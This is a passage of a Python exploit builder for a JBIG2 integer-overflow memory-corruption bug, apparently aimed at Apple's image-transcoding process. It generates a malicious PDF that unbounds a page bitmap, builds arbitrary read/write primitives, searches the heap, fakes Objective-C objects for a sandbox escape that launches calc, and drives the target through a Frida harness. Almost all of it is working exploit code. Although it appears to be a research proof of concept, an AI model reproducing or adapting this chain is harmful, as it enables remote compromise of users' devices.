	replace_bytes_at_offset(f, all_frame_elemsOffset+0x18, struct.pack("<Q", ((0*8) << 32) | 0x8))
	# flags
	replace_bytes_at_offset(f, all_frame_elemsOffset+0x20, struct.pack("<Q", 0x0000515100000000))
	######
	# elem 1 (2nd elem)
	replace_bytes_at_offset(f, all_frame_elemsOffset + frame_elem_size, struct.pack("<Q", 0x0))
	# last element
	curr_pointer_offset = all_frame_elemsOffset + 8 + frame_elem_size
	replace_bytes_at_offset(f, curr_pointer_offset, struct.pack("<Q", all_frame_elemsOffset + frame_elem_size + frame_elem_size))
	add64(f, curr_pointer_offset, storage1)
	replace_bytes_at_offset(f, frame_elem_size + all_frame_elemsOffset+0x10, struct.pack("<Q", 0x8))
	# (i*8) << 32 | 0x8
	replace_bytes_at_offset(f, frame_elem_size + all_frame_elemsOffset+0x18,  struct.pack("<Q", ((1*8) << 32) | 0x8))
	# flags
	replace_bytes_at_offset(f, frame_elem_size + all_frame_elemsOffset+0x20, struct.pack("<Q", 0x0000515100000000))
	#########
	# elem 2 (last elem)
	replace_bytes_at_offset(f, all_frame_elemsOffset + frame_elem_size + frame_elem_size, struct.pack("<Q", 0x0))
	# last element
	replace_bytes_at_offset(f, frame_ret_valueOffset+0x8 + frame_elem_size + frame_elem_size, struct.pack("<Q", 0x0))
	replace_bytes_at_offset(f, frame_elem_size + frame_elem_size + all_frame_elemsOffset+0x10, struct.pack("<Q", 0x8))
	# (i*8) << 32 | 0x8
	replace_bytes_at_offset(f, frame_elem_size + frame_elem_size + all_frame_elemsOffset+0x18, struct.pack("<Q", ((2*8) << 32) | 0x8))
	# flags
	replace_bytes_at_offset(f, frame_elem_size + frame_elem_size + all_frame_elemsOffset+0x20, struct.pack("<Q", 0x0000515100000000))

	"""
	All but the top level object (LSProgressNotificationTimer) and NSData->_bytes is now set up!
	Now setup NSData->_bytes
	"""
	# consume a placeholder bitmap to make room for our allocation bitmap at the end of the list
	grrs = genericRefinementRegionSegment(0x1, 0x1, garbage_bit, 0, AND, 2, [0,0], [0,0], b"\x7f\xff\xac")
	grrs_sh = segmentHeaderWithRefSegsLarge(0xffffffff, COMBINE, 0xE0000001, b"\x00" + struct.pack(">I", 0xc0ffee), 1, len(grrs.raw()))
	f.write(grrs_sh.raw() + grrs.raw())
	# refactor TODO: AND vs REPLACE difference
	#f.write(create_consume_placeholder_bytes())


	# the length should be expanded size, not length of arithmetic encoded bytes
	grrs = genericRefinementRegionSegment(
			(initial_execution_archive_compressed_size) << 3,
			0x1, 0, 0, 1, 0, [3,-3,2,-2], [-1, -1, -2, -2], 
			encoded_bytes.compressedInitialExecutionArchive_bytes
		)
	grrs_sh = segmentHeader(0xA110C, STORE_BYTES, 0, 0, len(grrs.raw()))
	f.write(grrs_sh.raw() + grrs.raw())

	# finally set up NSData->_bytes
	# modify fake jbig2bitmap pointer to point to last segment in list
	replace_offset_to_offset(f, spoofed_bitmap_data, data_buffer_to_segments + (0x8 * 0x1e), 8)
	# adjust pointer to directly read data pointer
	replace_bytes_at_offset(f, rbx, struct.pack("<Q",spoofed_bitmap_data))
	add64(f, spoofed_bitmap_data, rbx)
	# spoofed bitmap now points to the A110C segment's data buffer
	
	# refactor TODO: make this a call to trigger arb read
	# trigger arbitrary read to read the pointer to allocated payload bytes, and move it to the
	# faked NSData object
	trs = textRegionSegment(64, 1, (NSDataOffset + NSConcreteMutableData__bytesOffset) << 3, 0, REPLACE, 0, 1, b"\xa9\x1e\x7f\xff\xac")
											# 0x20 is 1 << 5, how nRefSegs is calced
	trs_sh = segmentHeaderWithRefSegs(6, 6, 0x20, b"\xde", 1, len(trs.raw()))
	f.write(trs_sh.raw() + trs.raw())

	# fingers crossed, object should be all set up!!!!
	f.write(ad_hoc_54_sh.raw())
	# confirmed to work for triggering calc when calling invalidate


def create_top_level_fake_objc_obj(f):
	# build fake object in the scratch space that will overwrite discovered NSDicts
	"""
	-[LSProgressNotificationTimer dealloc]    CoreServices:__text    0x180751004
		
		void __cdecl -[LSProgressNotificationTimer dealloc](LSProgressNotificationTimer *self, SEL a2)
		{
		objc_super v3; // [xsp+0h] [xbp-20h] BYREF

		-[NSTimer invalidate](self->_timer, "invalidate");
		v3.receiver = self;
		v3.super_class = (Class)&OBJC_CLASS___LSProgressNotificationTimer;
		-[NSObject dealloc](&v3, "dealloc");
		}
	"""

	replace_bytes_at_offset(f, new_rdx, struct.pack("<Q", negative(static_jbig2_bitmap_vtable_offset)))
	add64(f, new_rdx, page_hop_spoofed_bitmap)
	# rdx now contains the dyld shared cache base
	
	calculated_LSProgressNotificationTimerClass_offset = 0x1D951D358 - static_dyld_shared_cache_base
	replace_bytes_at_offset(f, scratch_space, struct.pack("<Q", calculated_LSProgressNotificationTimerClass_offset))
	add64(f, scratch_space, new_rdx)

	# read the pointer to other fake object chain into the _timer field
	# _timer offset is 0x10, 0x8 is never referenced, so begin 0x10 byte write there
	trs = textRegionSegment(64 * 2, 1, (scratch_space + 8) << 3, 0, REPLACE, 0, 1, b"\xa9\x5b\xff\xac")
											# 0x20 is 1 << 5, how nRefSegs is calced 
	trs_sh = segmentHeaderWithRefSegs(6, 6, 0x20, b"\xde", 1, len(trs.raw()))
	f.write(trs_sh.raw() + trs.raw())


def jbigstream_search(f, search_length):
	# convert ASLR adjusted bitmap vtable to stream vtable
	replace_bytes_at_offset(f, data_buffer_to_bitmap, struct.pack("<Q",static_jbig2_stream_vtable_base_addr - static_jbig2_bitmap_vtable_base_addr))
	# reuse the pageBitmap's vtable to store the search value, we already have stored the leaked heap region pointer
	# as the current search guess in the first spoofed bitmap
	add64(f, data_buffer_to_bitmap, spoofed_bitmap) 

	xor_bit = (flags << 3) + 3
	accumulator = (flags << 3) + 4
	for p in range(0, search_length, 0x10):#8):
		print("\r[+] Creating jbig2stream search", hex(p), end="")

		# accumulator doesn't ever need to be reset, as this is a 1 of 1 search
		# subtract 0x10 from current pointer
		# lead with this, as leaked pointer is not the jbig2stream
		# ------
		# above isn't true, individual searches must be reset because of OR accumulation
		# but the accumulator writing into SDS size should be done with AND.
		# above would be true if we reused sds size as the accumulator
		xor_bits_offset_to_offset(f, accumulator, accumulator)


		add64(f, spoofed_bitmap_data, rdx)
		# deref current guess and place it into rcx

		trs = textRegionSegment(64 * 1, 1, (rcx) << 3, 0, REPLACE, 0, 1, b"\xa9\x5b\xff\xac")
												# 0x20 is 1 << 5, how nRefSegs is calced 
		trs_sh = segmentHeaderWithRefSegs(6, 6, 0x20, b"\xde", 1, len(trs.raw()))
		f.write(trs_sh.raw() + trs.raw())

		# compare rcx to sdsstream value
		for i in range(0, 5 * 8): # only need to compare the lower 5 bytes
			src1_bit = ((rcx + (i // 8)) << 3) + (7 - (i % 8))
			src2_bit = ((data_buffer_to_bitmap + (i // 8)) << 3) + (7 - (i % 8))
			###
			# replace_bits_offset_to_offset(f, xnor_bit, src1_bit)
			# xnor_bits_offset_to_offset(f, xnor_bit, src2_bit)
			# and_bits_offset_to_offset(f, accumulator, xnor_bit)
			###
			replace_bits_offset_to_offset(f, xor_bit, src1_bit)
			xor_bits_offset_to_offset(f, xor_bit, src2_bit)
			or_bits_offset_to_offset(f, accumulator, xor_bit)
			# accumulator will now hold 0 if equal, or 1 if not

		#f.write(ad_hoc_10_sh.raw())
		# copy the pointer back into rcx, then and the accumulator with 
		# (spoofed_sds_size << 3) + 6. This will set sds size to 0, and all other
		# derefs will fail. At the end of the search, the found sds value will be in
		# rcx
		f.write(ad_hoc_10_sh.raw())
		trs = textRegionSegment(64 * 1, 1, (rcx) << 3, 0, REPLACE, 0, 1, b"\xa9\x2f\xff\xac")
											# 0x20 is 1 << 5, how nRefSegs is calced 
		trs_sh = segmentHeaderWithRefSegs(6, 6, 0x20, b"\xde", 1, len(trs.raw()))
		
		f.write(trs_sh.raw() + trs.raw())
		and_bits_offset_to_offset(f, (spoofed_sds_size << 3) + 6, accumulator)
		f.write(ad_hoc_10_sh.raw())

		
		
		#f.write(print_bitmap_sh.raw())

		# confirmed to work in limited testing

	# reset sds size for future ops
	f.write(debug_sh.raw())
	replace_bytes_at_offset(f, spoofed_sds_size, struct.pack("<I",2))
	
	print("\n[+] Created jbig2stream search")

	f.write(debug_sh.raw())


def nsdictionary_search(f, search_length):
	# initialize search value for NSDicitonary and overwrite
	# rax - rcx can be reused, rdx has base of shared cache
	replace_bytes_at_offset(f, new_rax, struct.pack("<Q", static_nsplaceholderdict_offset))
	add64(f, new_rax, new_rdx) 
	# nsdict search value in rax
	
	# when performing this search in frida, the real isa pointer is similar to
	# 0x000021a1fdb44269. Adjust the upper and lower bits to match the isa pointer

	# get the ASLR portion of the isa					 
	replace_bytes_at_offset(f, new_rcx, struct.pack("<Q", 0x0000fffff000))
	for i in range(0, 0x40):
		src_bit = ((new_rcx + i // 8) << 3) + (7 - (i % 8))
		dst_bit = ((new_rax + i // 8) << 3) + (7 - (i % 8))
		and_bits_offset_to_offset(f, dst_bit, src_bit)
	
	replace_bytes_at_offset(f, new_rcx, struct.pack("<Q", 0x21a100000269))
	for i in range(0, 0x40):#0x40):
		src_bit = ((new_rcx + i // 8) << 3) + (7 - (i % 8))
		dst_bit = ((new_rax + i // 8) << 3) + (7 - (i % 8))
		or_bits_offset_to_offset(f, dst_bit, src_bit)
	
	# refactor TODO: remove
	f.write(ad_hoc_61_sh.raw()) # dump new bitmap chain and new registers

	# start searching for rax value!

	# to save space, reuse the lower bits of the base address when doing calculations
	# 0xfff is usable, example base address: 0x1A4C7C000 
	sds_size_lsb = ((page_hop_spoofed_sds_size) << 3) + 7 
	accumulator = (new_rdx << 3) + 7
	xnor_bit = (new_rdx << 3) + 5

	accumulator = (new_rdx << 3)

	start_search = scratch_space + 0x18 # 0x60, starting at a 0x10 aligned address
	
	for p in range(start_search, search_length, 0x10):#8):
		# accumulator has to be initialized to 1 for and collection
		xnor_bits_offset_to_offset(f, accumulator, accumulator)
		
		print("\r[+] Creating nsdictionary search", hex(p), end="")
		# if p % 0x100 == 0:
		# 	print("\rcreating jbig2stream search", hex(p), end="")

		for i in range(0, 64):
			src1_bit = ((new_rax + (i // 8)) << 3) + (7 - (i % 8))
			src2_bit = ((p + (i // 8)) << 3) + (7 - (i % 8))
			replace_bits_offset_to_offset(f, xnor_bit, src1_bit)
			xnor_bits_offset_to_offset(f, xnor_bit, src2_bit)
			and_bits_offset_to_offset(f, accumulator, xnor_bit)
			#f.write(ad_hoc_63_sh.raw())
			
			#f.write(ad_hoc_56_sh.raw()) 
			
		# accumulator will now hold 1 if equal, or 0 if not
		replace_bits_offset_to_offset(f, sds_size_lsb, accumulator)

		f.write(ad_hoc_9_sh.raw())
		trs = textRegionSegment(64 * 4, 1, (p) << 3, 0, REPLACE, 0, 1, b"\xa9\x5b\xff\xac")
												# 0x20 is 1 << 5, how nRefSegs is calced 
		trs_sh = segmentHeaderWithRefSegs(6, 6, 0x20, b"\xfe", 1, len(trs.raw()))
		f.write(trs_sh.raw() + trs.raw())
		#replace_bytes_at_offset(f, struct.pack("<Q", 0x4141414141414141), p)
		f.write(ad_hoc_9_sh.raw())
		#f.write(print_bitmap_sh.raw())
	print("\n[+] Created nsdictionary search")


def page_hop(f, search_length):
	# point spoofed bitmap data to first free register. rcx contains the address of the jbig2stream
	replace_bytes_at_offset(f, spoofed_bitmap_data, struct.pack("<Q",rcx))
	add64(f, spoofed_bitmap_data, data_buffer_to_bitmap_data)

	# point 2nd spoofed bitmap data to sds vtable
	# this will be used to reconstruct the arbitrary read primitive after the page hop
	replace_bytes_at_offset(f, spoofed_bitmap2_data, struct.pack("<Q",spoofed_sds_vtable))
	add64(f, spoofed_bitmap2_data, data_buffer_to_bitmap_data)

	"""
	why search length? After the page hop, we are _rushing_ to finish the exploit. We have 0
	stability guarantees for anything that isn't the jbig2stream, we'll have to corrupt some object. The
	idea here was to corrupt something that was hopefully allocated very early (temporally) and wouldn't be referenced until
	we exit the jbig2stream parsing. There are some improvements that can be made here, like searching again for objects we sprayed (page bitmaps)
	and maybe using their buffers. For a AaaS vendor, this would be necessary, for a fun PoC it's not.

	We subtract a large known value from the jbig2stream address, then page hop _there_. All of the new arbitrary read related
	objects will be faked at this random address, then used to search for an NSDictionary and correct the jbig2stream
	Heap:
																		pointer we searched for
	_________________________________________________________________|____________
	|random object we corrupt| ----------> search_length ----------> | jbig2stream
	"""
	replace_bytes_at_offset(f, rdx, struct.pack("<Q", negative(search_length)))
	add64(f, rcx, rdx)
	#replace_bytes_at_offset(f, struct.pack("<Q",spoofed_bitmap_data), rax)

	# place pointer to faked objects directly behind rcx
	replace_bytes_at_offset(f, rdx,  struct.pack("<Q", 0x80))
	#replace_bytes_at_offset(f, struct.pack("<Q",_UIViewServiceTextEffectsOperatorOffset), rcx)
	add64(f, rdx, data_buffer_to_bitmap_data)


	f.write(debug_sh.raw())
	f.write(print_segments_sh.raw())
	# read one pointer from the first spoofed bitmap, which points to rcx, to overwrite the last segment in the segment list.
	# This is already a placeholder, no need to create a new one
	trs = textRegionSegment(64 * 1, 1, (data_buffer_to_segments + (8 * 0x1e)) << 3, 0, REPLACE, 0, 1, b"\xa9\x5b\xff\xac")
	#trs = textRegionSegment(64 * 1, 1, (data_buffer_to_segments + (8 * 0x1f)) << 3, 0, REPLACE, 0, 1, b"\xa9\x2f\xff\xac")
											# 0x20 is 1 << 5, how nRefSegs is calced 
	trs_sh = segmentHeaderWithRefSegs(6, 6, 0x20, b"\xde", 1, len(trs.raw()))
	f.write(trs_sh.raw() + trs.raw())
		#f.write(print_segments_sh.raw())
	#f.write(ad_hoc_14_sh.raw())

	"""
	At this moment, it is CRITICAL that we do not use relative reads/writes. This is because a relative OP inserts a segment into the list
	in the last index, then traverses the whole list checking each segnum. If that happened right now, the pointer we just wrote into the list
	would be dereferenced, and we have no idea what's there (as we intend to overwrite it after the page hop). We must use the SDS we've faked
	until we have our new faked SDS set up
	
	Below is the actual page hop, a single write to our pageBitmap->data member which migrates the page to an earlier heap region
	"""
	# atomic copy pointer to page hop destination	

	# refactor TODO: good ref when cleaning up TRS indexing
	#trs = textRegionSegment(64 * 3, 1, (data_buffer_to_bitmap_data) << 3, 0, REPLACE, 0, 1, b"\xa9\x1e\x7f\xff\xac")
	# TODO need to clean up the refs for textRegionSegment to use indexing and not 0xdeadbeef, which works accidentally
	#trs = textRegionSegment(64 * 3, 1, (data_buffer_to_bitmap_data) << 3, 0, REPLACE, 0, 1, b"\xa9\x5b\xff\xac")
	# really just need to write 1 pointer, not 3
	trs = textRegionSegment(64 * 1, 1, (data_buffer_to_bitmap_data) << 3, 0, REPLACE, 0, 1, b"\xa9\x5b\xff\xac")
											# 0x20 is 1 << 5, how nRefSegs is calced 
	trs_sh = segmentHeaderWithRefSegs(6, 6, 0x20, b"\xde", 1, len(trs.raw()))
	f.write(trs_sh.raw() + trs.raw())
	
	
	"""
	Page hop complete! Must fake the SDS we inserted into the list to restore relative reads/writes
	"""		

	# create atomic read/write object chain again
	# write the sds vtable and segnum into the first bytes of the page migration
	# this prevents crashes with relative reads/writes, as the full segment list is traversed
	trs = textRegionSegment(64 * 2, 1, (page_hop_spoofed_sds) << 3, 0, REPLACE, 0, 1, b"\xa9\x2f\xff\xac")
											# 0x20 is 1 << 5, how nRefSegs is calced 
	trs_sh = segmentHeaderWithRefSegs(6, 6, 0x20, b"\xde", 1, len(trs.raw()))
	f.write(trs_sh.raw() + trs.raw())
	
	"""
	Ability to use relative reads/writes is now restored, as the new SDS has a vtable and segnum to check!
	Now finish setting up the new SDS and bitmap
	"""		
	
	# touch up the new sds
	# set new segnum
	replace_bytes_at_offset(f, page_hop_spoofed_sds_segnum, struct.pack("<I", 0xfe))
	# populate size
	replace_bytes_at_offset(f, page_hop_spoofed_sds_size, struct.pack("<I", 0x0))

	# calculate pointer to spoofed *bitmap array
	# first write pointer to sds
	trs = textRegionSegment(64 * 1, 1, (page_hop_spoofed_sds_bitmaps_array) << 3, 0, REPLACE, 0, 1, b"\xa9\x5b\xff\xac")
											# 0x20 is 1 << 5, how nRefSegs is calced 
	trs_sh = segmentHeaderWithRefSegs(6, 6, 0x20, b"\xde", 1, len(trs.raw()))
	f.write(trs_sh.raw() + trs.raw())
	
	replace_bytes_at_offset(f, new_rax, struct.pack("<Q", page_hop_spoofed_sds_bitmaps_array_entry))
	add64(f, page_hop_spoofed_sds_bitmaps_array, new_rax)
	# bitmaps array pointer now populated, points to first entry in bitmaps array
	
	# now create pointer to new spoofed bitmap
	replace_offset_to_offset(f, page_hop_spoofed_sds_bitmaps_array_entry, page_hop_spoofed_sds_bitmaps_array, 8)
	# need to add 0x10 to the **bitmaps, this skips over 0x20 which is flags
	replace_bytes_at_offset(f, new_rax, struct.pack("<Q", page_hop_spoofed_bitmap - page_hop_spoofed_sds_bitmaps_array_entry))
	add64(f, page_hop_spoofed_sds_bitmaps_array_entry, new_rax)

	# page hop spoofed sds is now built
	# fill out the spoofed bitmap 
	
	# copy sds vtable
	replace_offset_to_offset(f, page_hop_spoofed_bitmap, page_hop_spoofed_sds_vtable, 8)		
	# sub 0x50 to create aslr adjusted bitmap vtable
	replace_bytes_at_offset(f, new_rax, struct.pack("<Q", negative(bitmap_vtable_to_sds_vtable)))
	add64(f, page_hop_spoofed_bitmap, new_rax)

	# set up the rest of the bitmap
	replace_bytes_at_offset(f, page_hop_spoofed_bitmap_segnum, struct.pack("<I", 0xdeadbeef))
	replace_bytes_at_offset(f, page_hop_spoofed_bitmap_w, struct.pack("<I", 64 * 4))
	replace_bytes_at_offset(f, page_hop_spoofed_bitmap_h, struct.pack("<I", 1))
	replace_bytes_at_offset(f, page_hop_spoofed_bitmap_line, struct.pack("<I", 1))
	# now create pointer to new spoofed bitmap scratch space
	replace_offset_to_offset(f, page_hop_spoofed_bitmap_data, page_hop_spoofed_sds_bitmaps_array_entry, 8)
	# add 0x20 to skip over bitmap contents, and another 0x20 to skip over registers
	replace_bytes_at_offset(f, new_rax, struct.pack("<Q", 0x20 + 0x20))
	add64(f, page_hop_spoofed_bitmap_data, new_rax)

	# bitmap and new SDS are now set up for arbitrary reads
	

def exploit():
	with open("poc.sym", "wb") as f:
		"""
		Normally this section populates the globalSegments variable with a symbol dictionary that
		could be referenced later to increment syms buffer size granularly by 1.
		This is stored in the globalSegments list so that overflow/boundless
		write doesn't corrupt this segment. 

		sds = symbolDictionarySegment(0, [0x03,0xFD,0x02,0xFE], [0xFF,0xFF,0xFE,0xFE], 1, 1, b"\x93\xFC\x7F\xFF\xAC")
		sds_sh = segmentHeader(0xff, 0, 1, 0, len(sds.raw()))
		f.write(sds_sh.raw() + sds.raw())

		when using the /Xref trick to initiate JBIG2 decoding in IMTranscoderAgent, globalSegments
		isn't populated. The following segment is read into the segments list, so we must 
		reference a segment that corrupts the entire current segments list and the pageBitmap.
		"""
		sds = create_segments_and_bitmap_corruption_sds()
		sds_sh = segmentHeader(overflow_sds_0x27_segnum, 0, 1, 0, len(sds.raw()))
		f.write(sds_sh.raw() + sds.raw())


	with open("poc.0000", "wb") as f:
		"""
		Generate the rest of the malicious PDF
		"""
		# refactor TODO: this can be removed, it's already in unbound_page
		# needed to appease a check for a page before storing bitmaps. This
		# page will be swapped out during the heap spray
		pis = pageInfoSegment(1, 1, 0, 0, 0, 0)
		pis_sh = segmentHeader(0xffffffff, 0x30, 0, 1, len(pis.raw()))
		f.write(pis_sh.raw() + pis.raw())

		"""
		Exploit the integer overflow to unbound the backing page bitmap
		"""
		unbound_page(f)
		# debug header to print the backing page bitmap
		f.write(print_bitmap_sh.raw())

		"""
		Set up VM layout
		"""
		setup_vm(f)
		# crash testing
		f.write(debug_sh.raw())
		
		"""
		ObjC object faking
		"""
		create_fake_objc_invalidate_chain(f)
		
		# refactor TODO: remoe this?
		# TODO set up 2 SDS VM, rework all additions to not use rax.
		# then we have the ability to fake a bitmap at the new location, and can
		# turn this into more atomic reads. Will do one 0x30 read of all 0s to totally
		# null out the jbig2stream, that way the program exits without crashing. 
		# retest with the SDS setup, refactor all of the code again, and ensure that calling
		# invalidate still pops calc with the correct object chain. From there, page hop, do the
		# dict search first, then finally search for the jbig2 stream (which should truncate
		# the search time even further

		"""
		All but the top level fake object are now set up.
		Must perform a page hop, then use relative writes to correct the jbig2stream
		to prevent a crash and plant LSProgressNotificationTimer objects. As part of the search and
		page hop, the VM Layout has to be modified a bit.
		"""

		"""
		Modify the VM layout to support 2 spoofed bitmaps, sacrificing rax, rbx, storage1, and unused SDS members
		"""
		# transition_vm()
		#refactor TODO: this should be reordered, transition should come before

		# point spoofed bitmap data to alternate heap region leaked pointer stored in pageBitmap->vtable
		replace_offset_to_offset(f, spoofed_bitmap_data, data_buffer_to_bitmap, 8)
		# populate register with -0x10 for search increments (allocs are 0x10 aligned)
		replace_bytes_at_offset(f, rdx, struct.pack("<Q", negative(0x10)))
		
		# overall strategy 
		# use one bitmap for arbitrary read, use one bitmap to copy pointer every search
		# into rcx. 

		# when found, set sds size to 0, so no other pointers will get copied

		transition_vm(f)
		

		# can now read with one bitmap, compare, copy current data pointer, set sds size to 0 if found
		# repeated this will leave us with address of jbig2stream in rcx 

		# need to populate storage1 with the comparison guess
	
		
		# search_length for both JBIG2Stream and NSDictionary vtable/isa values
		search_length = 0xA000
		# do actual search
		jbigstream_search(f, search_length)
		# jbig2stream address is now in rcx
		
		"""
		Migrate to the jbig2stream heap region with a page hop. Will hop to
		jbig2Stream - search_length, to secure more (hopefully non-critical) scratch space
		"""
		page_hop(f, search_length)
		"""
		bitmap pointer now points to directly after all new faked objects + registers, this will be used
		as scratch space 
		"""
		
		"""
		Finalize the Objc object chain with a fake LSProgressNotificationTimer, which converts a dealloc to an
		invalidate, which triggers the invalidate to invoke chain
		"""
		create_top_level_fake_objc_obj(f)
		"""
		scratch space now holds LSProgressNotificationTimer that leads to opening calc when dealloced!
		bitmap is also pointing to the scratch space and will copy the full object when referenced 
		"""

		"""
		Search for all NSDictionaries in search_length and replace them with the fake LSProgressNotificationTimer
		"""
		nsdictionary_search(f, search_length)
		
		"""
		Last step, 0 out a few pointers in the JBIG2Stream to ensure successful exit from the stream parsing.
		After exiting the stream parsing, one of the overwritten NSDictionary objects should be dealloced soon after,
		kicking off the sandbox escape
		"""
		
		# finally, 0 out the jbig2stream to exit gracefully
		# stream is search_length above pagebitmap 
		replace_bytes_at_offset(f, scratch_space, struct.pack("<Q", 0))
		replace_bytes_at_offset(f, scratch_space + 8, struct.pack("<Q", 0))
		replace_bytes_at_offset(f, scratch_space + 0x10, struct.pack("<Q", 0))
		replace_bytes_at_offset(f, scratch_space + 0x18, struct.pack("<Q", 0))

		# this could be 1 or 0 depending on the last pointer searched, must be 1 for the atomic write
		replace_bytes_at_offset(f, page_hop_spoofed_sds_size, struct.pack("<I", 0x1))
		
		trs = textRegionSegment(64 * 4, 1, (search_length + 0x30) << 3, 0, REPLACE, 0, 1, b"\xa9\x5b\xff\xac")
												# 0x20 is 1 << 5, how nRefSegs is calced 
		trs_sh = segmentHeaderWithRefSegs(6, 6, 0x20, b"\xfe", 1, len(trs.raw()))
		f.write(trs_sh.raw() + trs.raw())
		
		
		f.write(ad_hoc_56_sh.raw())

		"""
		____________ 
		< Wow, 1337! >
		------------ 
			   \   ^__^
				\  (oo)\_______
				   (__)\       )\/\
					   ||----w |
					   ||     ||
		If everything above was successful, expect calc!
		"""
		return



def on_spawned(spawn, dev, target_process, script_file):
	if spawn.identifier == target_process:
		print(f"[!] Target process {target_process} spawned, attaching")
		active_session = dev.attach(spawn.pid)
		#print("[+] active frida session!, creating script")
		with open(script_file, 'r') as file:
			script_text = file.read()
		script = active_session.create_script(script_text)
		def on_message(spawn, message, data):
			#print('on_message:', spawn, message, data)
			if message["type"] == 'send':
				p = message["payload"]
				if p == "[!!BUFFER!!]":
					#print("[FRIDA] flushing buffer")
					script.post({'type': 'input', 'payload': "go"})
				elif p == "[!!BUG VALID HEAP!!]":
					# triggering bug
					print("=========================")
					print("🐛 magic is in the air 🐛")
					print("=========================")
					#for i in range(3, -1, -1):
					# TODO revert after finding dealloc gadget
					for i in range(-1, -1, -1):
						end = ""
						if i == 0:
							end = "\n"
						print(f"\r[+] Triggering bug in {i}...", end=end)
						time.sleep(1)
					script.post({'type': 'input', 'payload': "go"})
				elif p == "[!!BUG INVALID HEAP!!]":
					print(f"\r[-] Triggering bug but expected to fail...")
					script.post({'type': 'input', 'payload': "go"})
				elif  p == "[!!PAUSE!!]":
					#input("[*] Script paused execution, hit enter to continue...")
					print("[+] pausing execution for 10 seconds")
					time.sleep(10)
					print("[+] resuming execution")
					script.post({'type': 'input', 'payload': "go"})

				else:
					# is there an attached buffer?
					if data:
						print("[FRIDA]", p)
						hexdump.hexdump(data)
					else:
						print("[FRIDA]", p)
					
			else:
				print(message)
			sys.stdout.flush()

		
		script.on('message', lambda message, data: on_message(spawn, message, data))
		script.load()
		
		#script.exports.init()
		#print("[+] resuming target process")
		
		active_session.resume()
		# need this for some reason when testing with settings
		# thought active_session.resume would suffice?
		dev.resume(spawn.pid)
		#print("[?] waiting for stdin...")
		#sys.stdin.read()



	else: 
		dev.resume(spawn.pid)
		print('[+] Resuming', spawn)
		




# writes file to tmp for proof of execution  
# [[NSFileManager defaultManager] createFileAtPath:@"/tmp/hacked" contents:nil attributes:nil]; 

"""
expression -l objc -O -- NSFileHandle *file = [NSFileHandle fileHandleForReadingAtPath: @"/var/tmp/serializedPayload"]; NSData *databuffer = [file readDataToEndOfFile]; NSData *payload = [NSKeyedUnarchiver unarchiveObjectWithData:databuffer]; NSUUID *uuid = [NSUUID UUID]; CTXPCServiceSubscriptionContext *ctx = [CTXPCServiceSubscriptionContext contextWithUUID:uuid]; [[[CoreTelephonyClient alloc] init] context:nil evaluateMobileSubscriberIdentity:payload]]
"""